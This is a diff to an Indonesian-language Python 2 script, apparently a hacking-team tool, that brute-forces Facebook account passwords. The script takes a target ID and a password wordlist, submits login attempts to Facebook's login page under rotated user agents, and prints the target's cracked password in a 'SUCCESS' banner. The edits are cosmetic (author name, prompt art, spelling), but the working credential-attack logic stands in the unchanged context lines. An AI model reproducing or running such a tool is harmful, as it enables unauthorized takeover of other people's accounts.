@@ -1,6 +1,6 @@
 #!usr
 # -*- coding: UTF-8 -*-
-# Mod by: whiskysix
+# Mod by: Whisky Six
 # team: Alone
 
 
@@ -61,10 +61,10 @@ banner()
     
 print wd+"         https://www.github.com/7H4 "
 print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
-email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
+email_target = str(raw_input(GL+"\033[92m╰─o==[]::::::::::::::::>\033[93m  "))
 print " "
 print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
-password_list = str(raw_input(GG+"╰────➲\033[93m "))
+password_list = str(raw_input(GG+"╰─o==[]::::::::::::::::>\033[93m "))
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
 # useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
@@ -73,7 +73,7 @@ def pil():
                 print GG+" "
                 g = str(raw_input("[?] Hack Fb lagi..\033[93;1m[y/n]: "))
                 if g == 'y' or g == 'Y':
-                    os.system('python2 brute.py')
+                    os.system('python2 WhiskySix-Fb-Bf.py')
                 elif g == 'n' or g == 'N':
                     print wd+"Keluar dari program..."
                     sys.exit()
@@ -125,7 +125,7 @@ def whiskysix(whiskysix_password):
 	if mask != login and (not 'login_attempt' in mask):
                         print " "
 			print ("\033[96m                S U C C E S S")
-			print "          P A S S W O R D  F I N D "
+			print "          P A S S W O R D  F O U N D"
                   	print RR+"+-------------------------------------------+"
 	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
         	        print (RR+"#\033[97m Password Target:\033[92m {}").format(whiskysix_password)
@@ -150,12 +150,12 @@ def runn_noobs():
 
          lop = GG+"""
 
-▒█░░▒█ █░░█ ░▀░ █▀▀ █░█ █░░█ 　 ▄▀▀
+▒█░░▒█ █░░█ ░▀░ █▀▀ █░█ █░░█ 　 ▄▀▀▄
 ▒█▒█▒█ █▀▀█ ▀█▀ ▀▀█ █▀▄ █▄▄█ 　 █▄▄░
 ▒█▄▀▄█ ▀░░▀ ▀▀▀ ▀▀▀ ▀░▀ ▄▄▄█ 　 ▀▄▄▀ \033[91;1m
 
                 \033[90;1mAlone\033[91;1m
-             Powered by:\033[97m WhiskySix 
+             Powered by:\033[97m Whisky Six 
       """
 
 
